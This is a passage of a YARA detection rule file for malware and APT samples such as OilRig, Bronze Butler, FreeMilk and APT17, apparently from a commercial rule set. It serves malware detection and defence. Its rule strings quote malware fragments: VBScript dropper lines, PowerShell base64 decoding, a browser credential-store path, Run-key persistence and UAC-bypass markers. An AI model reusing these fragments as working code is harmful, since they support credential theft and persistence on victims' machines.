\"bfc5c6817ff2cc4f3cd40f649e10cc9ae1e52139f35fdddbd32cb4d221368922\"\n      hash2 = \"80b931ab1798d7d8a8d63411861cee07e31bb9a68f595f579e11d3817cfc4aca\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mock_run_ini_Win32.dll\" fullword ascii\n      $x2 = \"mock_run_ini_x64.dll\" fullword ascii\n      $s1 = \"RealCmd=%s %s\" fullword ascii\n      $s2 = \"MockModule=%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule VBScript_Favicon_File_RID2F22 : ANOMALY APT DEMO FILE G0065 T1218_005 {\n   meta:\n      description = \"VBScript cloaked as Favicon file used in Leviathan incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\"\n      date = \"2017-10-18 11:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"39c952c7e14b6be5a9cb1be3f05eafa22e1115806e927f4e2dc85d609bc0eb36\"\n      tags = \"ANOMALY, APT, DEMO, FILE, G0065, T1218_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"myxml = '<?xml version=\\\"\\\"1.0\\\"\\\" encoding=\\\"\\\"UTF-8\\\"\\\"?>';myxml = myxml +'<root>\" ascii\n      $x2 = \".Run \\\"taskkill /im mshta.exe\" ascii\n      $x3 = \"<script language=\\\"VBScript\\\">Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 :\" ascii\n      $s1 = \".ExpandEnvironmentStrings(\\\"%ALLUSERSPROFILE%\\\") &\" ascii\n      $s2 = \".ExpandEnvironmentStrings(\\\"%temp%\\\") & \" ascii\n   condition: \n      filesize < 100KB and ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule OilRig_Strings_Oct17_RID2E8D : APT DEMO G0049 MIDDLE_EAST {\n   meta:\n      description = \"Detects strings from OilRig malware and malicious scripts\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/\"\n      date = \"2017-10-18 11:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"APT, DEMO, G0049, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%localappdata%\\\\srvHealth.exe\" fullword wide ascii\n      $x2 = \"%localappdata%\\\\srvBS.txt\" fullword wide ascii\n      $x3 = \"Agent Injector\\\\PolicyConverter\\\\Inner\\\\obj\\\\Release\\\\Inner.pdb\" ascii\n      $x4 = \"Agent Injector\\\\PolicyConverter\\\\Joiner\\\\obj\\\\Release\\\\Joiner.pdb\" ascii\n      $s3 = \".LoadDll(\\\"Run\\\", arg, \\\"C:\\\\\\\\Windows\\\\\\\\\" ascii\n   condition: \n      filesize < 800KB and 1 of them\n}\n\nrule OilRig_ISMAgent_Campaign_Samples1_RID3372 : APT DEMO FILE G0049 MIDDLE_EAST {\n   meta:\n      description = \"Detects OilRig malware from Unit 42 report in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/\"\n      date = \"2017-10-18 14:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\"\n      hash2 = \"0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c\"\n      tags = \"APT, DEMO, FILE, G0049, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"###$$$TVqQAAMAAAAEAAAA\" ascii\n      $s2 = \"C:\\\\Users\\\\J-Win-7-32-Vm\\\\Desktop\\\\error.jpg\" fullword wide\n      $s3 = \"$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes(\" ascii\n      $s4 = \" /c echo powershell > \" fullword wide ascii\n      $s5 = \"\\\\Libraries\\\\servicereset.exe\" wide\n      $s6 = \"%DestFolder%\" fullword wide ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 2 of them\n}\n\nrule OilRig_ISMAgent_Campaign_Samples2_RID3373 : APT DEMO EXE FILE G0049 MIDDLE_EAST T1218_009 {\n   meta:\n      description = \"Detects OilRig malware from Unit 42 report in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/\"\n      date = \"2017-10-18 14:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4\"\n      hash2 = \"33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647\"\n      tags = \"APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1218_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PolicyConverter.exe\" fullword wide\n      $x2 = \"SrvHealth.exe\" fullword wide\n      $x3 = \"srvBS.txt\" fullword wide\n      $s1 = \"{a3538ba3-5cf7-43f0-bc0e-9b53a98e1643}, PublicKeyToken=3e56350693f7355e\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\RegAsm.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 2 of ( $x* ) or 3 of them )\n}\n\nrule BronzeButler_Daserf_Delphi_1_RID31E8 : APT CHINA DEMO EXE FILE G0060 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 13:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-11-30\"\n      hash1 = \"89a80ca92600af64eb9c32cab4e936c7d675cf815424d72438973e2d6788ef64\"\n      hash2 = \"b1bd03cd12638f44d9ace271f65645e7f9b707f86e9bcf790e0e5a96b755556b\"\n      hash3 = \"22e1965154bdb91dd281f0e86c8be96bf1f9a1e5fe93c60a1d30b79c0c0f0d43\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Services.exe\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n      $s3 = \"l32.dll\" fullword ascii\n      $s4 = \"tProcess:\" fullword ascii\n      $s5 = \" InjectPr\" ascii\n      $s6 = \"Write$Error creating variant or safe array\\x1fInvalid argument to time encode\" fullword wide\n      $s7 = \"on\\\\run /v \" fullword ascii\n      $s8 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run\" fullword ascii\n      $s9 = \"ms1ng2d3d2.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}\n\nrule BronzeButler_Daserf_C_1_RID2FD5 : APT CHINA DEMO EXE FILE G0060 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 12:14:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a4afd9df1b4cc014c3a89d7b4a560fa3e368b02286c42841762714b23e68cc05\"\n      hash2 = \"90ac1fb148ded4f46949a5fea4cd8c65d4ea9585046d66459328a5866f8198b2\"\n      hash3 = \"331ac0965b50958db49b7794cc819b2945d7b5e5e919c185d83e997e205f107b\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0060\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com.\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)\" fullword ascii\n      $a1 = \"ndkkwqgcm\" fullword ascii\n      $a2 = \"RtlGetCo\" fullword ascii\n      $a3 = \"hutils\" fullword ascii\n      $b1 = \"%USERPROFILE%\\\\System\" fullword ascii\n      $b2 = \"msid.dat\" fullword ascii\n      $b3 = \"DRIVE_REMOTE\" fullword wide\n      $b4 = \"%s%s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n      $b5 = \"jcbhe.asp\" fullword ascii\n      $b6 = \"edset.asp\" fullword ascii\n      $b7 = \"bxcve.asp\" fullword ascii\n      $b8 = \"hcvery.php\" fullword ascii\n      $b9 = \"ynhkef.php\" fullword ascii\n      $b10 = \"dkgwey.php\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"088382f4887e3b2c4bd5157f2d72b618\" or all of ( $a* ) or 4 of them )\n}\n\nrule BronzeButler_DGet_1_RID2E42 : APT CHINA DEMO EXE FILE G0060 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 11:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"bd81521445639aaa5e3bcb5ece94f73feda3a91880a34a01f92639f8640251d6\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"DGet Tool Made by XZ\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )\n}\n\nrule BronzeButler_UACBypass_1_RID3029 : APT CHINA DEMO EXE FILE G0060 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 12:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fe06b99a0287e2b2d9f7faffbda3a4b328ecc05eab56a3e730cfc99de803b192\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\BypassUacDll.pdb\" ascii\n      $x2 = \"%programfiles%internet exploreriexplore.exe\" fullword wide\n      $x3 = \"Elevation:Administrator!new:{3ad055\" fullword wide\n      $x4 = \"BypassUac.pdb\" fullword ascii\n      $x5 = \"[bypassUAC] started X64\" fullword wide\n      $x6 = \"[bypassUAC] started X86\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them )\n}\n\nrule BronzeButler_xxmm_1_RID2EA8 : APT CHINA DEMO EXE FILE G0060 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 11:23:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7197de18bc5a4c854334ff979f3e4dafa16f43d7bf91edfe46f03e6cc88f7b73\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\ReflectivLoader.pdb\" ascii\n      $x3 = \"\\\\Projects\\\\xxmm2\\\\Release\\\\\" ascii\n      $x5 = \"http://127.0.0.1/phptunnel.php\" fullword ascii\n      $s1 = \"xxmm2.exe\" fullword ascii\n      $s2 = \"\\\\AvUpdate.exe\" wide\n      $s3 = \"stdapi_fs_file_download\" fullword ascii\n      $s4 = \"stdapi_syncshell_open\" fullword ascii\n      $s5 = \"stdapi_execute_sleep\" fullword ascii\n      $s6 = \"stdapi_syncshell_kill\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule Saudi_Phish_Trojan_RID2E2F : DEMO EXE FILE MAL T1203 T1566_001 {\n   meta:\n      description = \"Detects a trojan used in Saudi Aramco Phishing\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/8ad94dc5d59aa1e9962c76fd5ca042e582566049a97aef9f5730ba779e5ebb91/detection\"\n      date = \"2017-10-12 11:03:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"8ad94dc5d59aa1e9962c76fd5ca042e582566049a97aef9f5730ba779e5ebb91\"\n      tags = \"DEMO, EXE, FILE, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 7B 00 30 00 7D 00 7B 00 31 00 7D 00 5C 00 00 09\n               2E 00 64 00 6C 00 6C 00 00 11 77 00 33 00 77 00\n               70 00 2E 00 65 00 78 00 65 00 00 1B 61 00 73 00\n               70 00 6E 00 65 00 74 00 5F 00 77 00 70 00 2E 00\n               65 00 78 00 65 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )\n}\n\nrule BKDR_Snarasite_Oct17_RID2E2A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-10-07 11:02:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"36ba92cba23971ca9d16a0b4f45c853fd5b3108076464d5f2027b0f56054fd62\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"322bef04e1e1ac48875036e38fb5c23c\" or pe.imphash ( ) == \"15088754757513c92fa36ba5590e907b\" )\n}\n\nrule FreeMilk_APT_Mal_1_RID2D6D : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"34478d6692f8c28332751b31fd695b799d4ab36a8c12f7b728e2cb99ae2efcd9\"\n      hash2 = \"35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2\"\n      hash3 = \"0f82ea2f92c7e906ee9ffbbd8212be6a8545b9bb0200eda09cce0ba9d7cb1313\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"\\\\milk\\\\Release\\\\milk.pdb\" ascii\n      $x2 = \"E:\\\\BIG_POOH\\\\Project\\\\\" ascii\n      $x3 = \"Windows-KB271854-x86.exe\" fullword wide\n      $s1 = \"Windows-KB275122-x86.exe\" fullword wide\n      $s2 = \"\\\\wsatra.tmp\" wide\n      $s3 = \"%s\\\\Rar0tmpExtra%d.rtf\" fullword wide\n      $s4 = \"\\\"%s\\\" help\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"108aa007b3d1b4817ff4c04d9b254b39\" or 1 of ( $x* ) or 4 of them )\n}\n\nrule FreeMilk_APT_Mal_2_RID2D6E : APT DEMO EXE FILE MAL T1113 {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54df\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1113\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"failed to take the screenshot. err: %d\" fullword ascii\n      $s2 = \"runsample\" fullword wide\n      $s3 = \"%s%02X%02X%02X%02X%02X%02X:\" fullword wide\n      $s4 = \"win-%d.%d.%d-%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"b86f7d2c1c182ec4c074ae1e16b7a3f5\" or all of them )\n}\n\nrule FreeMilk_APT_Mal_3_RID2D6F : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef40f7ddff404d1193e025081780e32f88883fa4dd496f4189084d772a435cb2\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CMD.EXE /C \\\"%s\\\"\" fullword wide\n      $s2 = \"\\\\command\\\\start.exe\" wide\n      $s3 = \".bat;.com;.cmd;.exe\" fullword wide\n      $s4 = \"Unexpected failure opening HKCR key: %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )\n}\n\nrule FreeMilk_APT_Mal_4_RID2D70 : APT DEMO EXE FILE MAL T1218_011 {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1218_011\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.6.0\"\n      \n   strings:\n      $x1 = \"base64Encoded=\\\"TVqQAAMAAAAE\" ascii\n      $s1 = \"SOFTWARE\\\\Clients\\\\StartMenuInternet\\\\firefox.exe\\\\shell\\\\open\\\\command\" fullword wide\n      $s2 = \"'Wscript.echo \\\"Base64 encoded: \\\" + base64Encoded\" fullword ascii\n      $s3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" ascii\n      $s4 = \"outFile=sysDir&\\\"\\\\rundll32.exe\\\"\" fullword ascii\n      $s5 = \"set shell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n      $s6 = \"command =outFile &\\\" sysupdate\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( ( pe.exports ( \"getUpdate\" ) and pe.number_of_exports == 1 ) or 1 of ( $x* ) or 3 of them )\n}\n\nrule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects an .url file that points to a local executable\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwareforme/status/915300883012870144\"\n      date = \"2017-10-04 10:31:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $s1 = \"[InternetShortcut]\" ascii wide fullword\n      $s2 = /URL=file:\\/\\/\\/C:\\\\[^\\n]{1,50}\\.exe/ \n   condition: \n      filesize < 400 and all of them\n}\n\nrule CMStar_Malware_Sep17_RID2E52 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CMStar Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/09/unit42-threat-actors-target-government-belarus-using-cmstar-trojan/\"\n      date = \"2017-10-03 11:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"16697c95db5add6c1c23b2591b9d8eec5ed96074d057b9411f0b57a54af298d5\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"UpdateService.tmp\" fullword ascii\n      $s2 = \"StateNum:%d,FileSize:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"22021985de78a48ea8fb82a2ff9eb693\" or pe.exports ( \"WinCred\" ) or all of them )\n}\n\nrule APT17_Malware_Oct17_1_RID2E03 : APT DEMO EXE FILE G0025 {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://intezer.com/blog/research/evidence-aurora-operation-still-active-part-2-more-ties-uncovered-between-ccleaner-hack-chinese-hackers/\"\n      date = \"2017-10-03 10:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dc9b5e8aa6ec86db8af0a7aa897ca61db3e5f3d2e0942e319074db1aaccfdc83\"\n      tags = \"APT, DEMO, EXE, FILE, G0025\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\spool\\\\prtprocs\\\\w32x86\\\\localspl.dll\" ascii\n      $s2 = \"\\\\spool\\\\prtprocs\\\\x64\\\\localspl.dll\" ascii\n      $s3 = \"\\\\msvcrt.dll\" ascii\n      $s4 = \"\\\\TSMSISrv.dll\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}\n\nrule APT17_Malware_Oct17_2_RID2E04 : APT DEMO EXE FILE G0025 {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://intezer.com/blog/research/evidence-aurora-operation-still-active-part-2-more-ties-uncovered-between-ccleaner-hack-chinese-hackers/\"\n      date = \"2017-10-03 10:56:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"20cd49fd0f244944a8f5ba1d7656af3026e67d170133c1b3546c8b2de38d4f27\"\n      tags = \"APT, DEMO, EXE, FILE, G0025\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"Cookie: __xsptplus=%s\" fullword ascii\n      $x2 = \"http://services.fiveemotions.co.jp\" fullword ascii\n      $x3 = \"http://%s/ja-JP/2015/%d/%d/%d%d%d%d%d%d%d%d.gif\" fullword ascii\n      $s1 = \"FoxHTTPClient_EXE_x86.exe\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3072\" ascii\n      $s3 = \"hWritePipe2 Error:%d\" fullword ascii\n      $s4 = \"Not Support This Function!\" fullword ascii\n      $s5 = \"Global\\\\PnP_No_Management\" fullword ascii\n      $s6 = \"Content-Type: image/x-png\" fullword ascii\n      $s7 = \"Accept-Language: ja-JP\" fullword ascii\n      $s8 = \"IISCMD Error:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.exports ( \"_foo@0\" ) or 1 of ( $x* ) or 6 of them )\n}\n\nrule APT17_Unsigned_Symantec_Binary_EFA_RID338C : APT DEMO EXE FILE G0025 {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://intezer.com/blog/research/evidence-aurora-operation-still-active-part-2-more-ties-uncovered-between-ccleaner-hack-chinese-hackers/\"\n      date = \"2017-10-03 14:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"128aca58be325174f0220bd7ca6030e4e206b4378796e82da460055733bb6f4f\"\n      tags = \"APT, DEMO, EXE, FILE, G0025\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"Copyright (c) 2007 - 2011 Symantec Corporation\" fullword wide\n      $s2 = \"\\\\\\\\.\\\\SYMEFA\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them and pe.number_of_signatures == 0 )\n}\n\nrule APT17_Malware_Oct17_Gen_RID2EEC : APT DEMO EXE FILE G0025 GEN {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://intezer.com/blog/research/evidence-aurora-operation-still-active-part-2-more-ties-uncovered-between-ccleaner-hack-chinese-hackers/\"\n      date = \"2017-10-03 11:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2\"\n      hash2 = \"07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d\"\n      hash3 = \"ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550\"\n      tags = \"APT, DEMO, EXE, FILE, G0025, GEN\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)\" fullword ascii\n      $x2 = \"http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM\" ascii\n      $s1 = \"hWritePipe2 Error:%d\" fullword ascii\n      $s2 = \"Not Support This Function!\" fullword ascii\n      $s3 = \"Cookie: SESSIONID=%s\" fullword ascii\n      $s4 = \"http://0.0.0.0/1\" fullword ascii\n      $s5 = \"Content-Type: image/x-png\" fullword ascii\n      $s6 = \"Accept-Language: en-US\" fullword ascii\n      $s7 = \"IISCMD Error:%d\" fullword ascii\n      $s8 = \"[IISEND=0x%08X][Recv:] 0x%08X %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"414bbd566b700ea021cfae3ad8f4d9b9\" or 1 of ( $x* ) or 6 of them ) )\n}\n\nrule redSails_EXE_RID2B89 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Red Sails Hacktool by WinDivert references\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/BeetleChunks/redsails\"\n      date = \"2017-10-02 09:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a7861d25b0c038d77838ecbd5ea5674650ad4f5faf7432a6f3cfeb427433fac\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bWinDivert64.dll\" fullword ascii\n      $s2 = \"bWinDivert32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them )\n}\n\nrule redSails_PY_RID2B50 : DEMO HKTL SCRIPT T1059_006 {\n   meta:\n      description = \"Detects Red Sails Hacktool - Python\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/BeetleChunks/redsails\"\n      date = \"2017-10-02 09:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6ebedff41992b9536fe9b1b704a29c8c1d1550b00e14055e3c6376f75e462661\"\n      hash2 = \"5ec20cb99030f48ba512cbc7998b943bebe49396b20cf578c26debbf14176e5e\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Gained command shell on host\" fullword 